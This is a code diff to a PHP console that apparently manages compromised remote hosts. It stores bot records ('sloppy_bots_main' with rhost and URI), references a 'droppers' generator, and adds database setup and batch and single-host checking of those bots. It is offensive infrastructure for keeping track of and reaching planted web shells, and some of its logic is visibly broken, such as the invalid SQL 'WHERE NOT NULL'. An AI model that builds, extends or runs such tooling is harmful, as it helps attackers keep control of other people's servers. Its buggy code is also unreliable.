@@ -6,6 +6,8 @@ if (strtolower(php_uname()) == "windows") {
 }
 require "includes/db/postgres_checker.php";
 require "includes/droppers/dynamic_generator.php";
+$firstRun = new postgres_checker();
+$firstRun->createDB();
 $cof = array(
     "useragent" => "sp1.1",
     "proxy" => "",
@@ -421,7 +423,7 @@ function check($host, $path, $batch)
     if (!empty($batch)) {
         switch ($batch) {
             case "y":
-                $c = pg_exec(pg_connect(DBCONN), "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL OR NOT '-'");
+                $c = pg_exec(pg_connect(DBCONN), "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL");
                 $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
                 echo "Pulling: " . pg_fetch_row($count) . "\nThis could take awhile.";
                 curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
@@ -636,16 +638,16 @@ while ($run) {
         case "ch":
             system(clears);
             try{
-                $b = readline("Is this going to be a batch job?(Y/N)\n->");
-                switch (!empty(strtolower($b))) {
+                $b = strtolower(readline("Is this going to be a batch job?(Y/N)\n->"));
+                switch ($b) {
+                    case "y":
+                        echo "Executing batch job!\n";
+                        check('0', 'b', "y");
+                        break;
                     case "n":
                         echo "Not executing batch job.\n";
                         $h = readline("Who is it we need to check on?(based on ID)\n->");
                         check($h, "chR", "n");
-                        break;
-                    case "y":
-                        echo "Executing batch job!\n";
-                        check('0', 'b', "y");
                         break;
                     default:
                         logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.\n", '');
